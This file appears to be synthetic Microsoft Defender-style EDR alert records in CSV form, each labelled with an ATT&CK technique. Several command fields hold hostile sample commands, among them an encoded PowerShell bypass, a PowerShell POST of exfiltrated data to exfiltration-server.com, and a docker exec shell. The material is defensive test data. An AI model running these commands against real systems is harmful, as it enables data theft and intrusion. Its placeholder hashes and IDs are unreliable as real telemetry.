iododw0r,,2022-04-01T09:22:14.866Z,,,,Deployment Tool,An instance of a software deployment tool was detected on a system,,,,,,,,,,,,microsoft.deploymentsomething.exe /install /quiet,,,,,,,,,,,High,,,,,,,,,,,,,EDR,,,,,,,,microsoft.deploymentsomething.exe,,,,192.168.0.10,,1234,5678,,,,,,,,,,,,,setup.exe,setup.exe /install,,,,,,,Endpoint,Hostname-01,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,C:\Users\Admin\Downloads\setup.exe,C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,Suspicious Trusted Relationship,Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.,,,,,,,,,,,,,Behavior monitoring,,,,,,,,,,High,,,,,Trusted Relationship,,,,,,,,,,,,,,,,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,,,192.168.1.100,,,,,,,,,,,,,,,,services.exe,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC-1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,20H2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\ntdll.dll,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c whoami,Execution,T1199,Trusted Relationship,00:11:22:33:44:55,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,,2023-03-06T14:30:00Z,,,,Automated Exfiltration,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,Defender for Endpoint,,,,,,,,explorer.exe,explorer.exe C:\Users\user1\Desktop\confidential.docx,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'RuleName': 'Block Exfiltration', 'RuleAction': 'Block', 'RuleID': 12345, 'NetworkProtocol': 'TCP', 'RemoteIP': '10.0.0.2', 'RemotePort': 8080}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,00-11-22-33-44-55,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.",Microsoft-Windows-Windows Firewall With Advanced Security/Firewall,Windows Firewall has blocked an application from accessing the network,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lkkkkjl0,,2023-03-10T12:00:00Z,,,,Domain Policy Modification,Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments,,,,,,Domain Policy Modification,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Domain Policy,example-policy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example-host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lllkld0,,2023-03-09T12:00:00.000000Z,,,,Fallback communication channel,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,,,,,powershell.exe,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,80,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HTTP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040607,,2023-03-09T12:00:00.000000Z,,,,Ingress Tool,Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp.,,,,,,Ingress Tool Transfer,,,,,,,,,,,,,,,,,Medium,,,EDR,,,,,,,,,,,,,,Initial Access,,,,powershell.exe,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,57234,10.0.2.15,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-34567,,2022-10-31T15:23:45Z,,,,File or process modification,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\OpenSSH\sshd.exe,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Modified OpenSSH binary detected on host SERVER-ABC,2022-10-31T14:45:00Z,A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0,B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,2023-03-08T14:30:00Z,,,,Scheduled Transfer,"This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,cmd.exe,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040506078,,2023-03-10T12:00:00Z,,,,Access Token Compromise,Indications of Access Token Manipulation activity have been found on the endpoint.,,,,,,Access Token Manipulation,,,,,,,,,,,,,,,,,High,,,,,Endpoint Detection and Response,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,,2022-10-31T23:59:59Z,,,,Bowser Extension,A suspicious browser extension detected on host DESKTOP-123 was installed on Google Chrome,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'DESKTOP-123', 'ip_address': '192.168.1.100'}",Suspicious Activity,Remove the suspicious browser extension from the host,"{'extension_name': 'Malicious Extension', 'extension_publisher': 'Unknown', 'browser_name': 'Google Chrome', 'browser_version': '95.0.4638.69', 'extension_path': 'C:\\Program Files\\Google\\Chrome\\Extensions\\maliciousextension'}",,,,,,,,,,,,,,,,,,,,,,,,,,,
334566777,,2023-03-10T12:00:00Z,,,,Debugger Evasion,Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment.,,,,,High,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,
99782345,,2022-03-15T10:30:00Z,,,,Potential website defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.",,,,,,,,,C:\inetpub\wwwroot\index.html,,,iexplore.exe https://example.com/,,,,,,,,,,,High,,,Behavior,,Web,,,,,,,,EDR,,,,,,,,C:\Windows\System32\iexplore.exe,,,,,,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-15T10:15:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SysWOW64\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,Web,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,Exfiltration Over Web Service,"This alert is triggered when there is suspicious network traffic that indicates exfiltration over a web service. This could be an indication of data exfiltration, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,explorer.exe,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1567,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:30:00Z,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,
33456678,,2023-03-10T15:00:00.000Z,,,,Deobfuscate-Decode Files,"An adversary may use Obfuscation or Encoding to hide or obscure the content of files or other information they are exfiltrating. These obfuscation and encoding techniques include ASCII, Base64, binary-to-text encoding, and others.",,,,,,Deobfuscate/Decode Files or Information,,,,,,,,,,,,,,,,,High,,,,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the endpoint for any signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,,2022-02-28T09:15:00Z,high,endpoint,,Unusual Connection Attempt,"Analysis of processes running has detected an uncommon connection attempt through applications layer protocol. This is very rare in normal operations, but a known technique for attackers attempting to bypass network-layer detections.",,,,,,,,,,,,,,,EDR,Command and Control,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,HTTPS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Application Layer Protocol,192.168.1.100,,,,,,,,,,,,,,,,,,,
0093345,,,,,,container administration,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.",,,,,,,,,,,,,,,,,,,,,,,High,,,EDR,,Behavioral,,,{},,New,,,Machine,,,,,,,,,docker exec -it mycontainer /bin/sh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mydomain.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.19041.1237,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,604800.0,2022-12-31T23:59:59Z,Behavior,false,2022-12-31T23:59:59Z,mycomputer.mydomain.com,mycomputer.mydomain.com,MYCOMPUTER,Windows 10 Enterprise,x64,2022-12-31T23:45:00Z,2022-12-31T23:59:59Z,DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,dockerd.exe,2022-12-31T23:45:00Z,Microsoft,High,Forced Container Administration Command
